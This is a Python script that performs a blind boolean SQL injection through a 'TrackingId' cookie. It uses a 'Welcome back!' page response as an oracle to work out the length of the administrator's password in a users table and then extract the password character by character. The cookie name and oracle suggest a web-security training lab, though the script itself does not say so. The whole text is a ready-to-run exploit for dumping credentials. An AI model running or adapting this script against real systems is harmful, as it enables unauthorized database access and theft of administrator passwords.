import requests,sys,json
from urllib.parse import quote_plus

def url(): 
    return sys.argv[1]

def target():
    session = requests.Session()
    session.get(url())
    return session.cookies.get_dict()["TrackingId"]

def oracle(q):
    payload = quote_plus(f"{target()}' AND ({q})--" )
    cookies = {
        "TrackingId": payload
    }
    response = requests.get(url(),cookies=cookies)
    return "Welcome back!" in response.text

#Calculate the Length
length=0
while not oracle(f"(SELECT LENGTH(password) FROM users WHERE username = 'administrator') = {length}"):
    length += 1
print()

#Dumping the Characters
for i in range(1, length+1):
    for c in list(range(48,58)) + list(range(65,123)):
        if oracle(f"(SELECT ASCII(SUBSTRING(password,{i},1)) FROM users WHERE username = 'administrator') = {c}"):
            print(chr(c),end="")
            sys.stdout.flush()
            break
print()
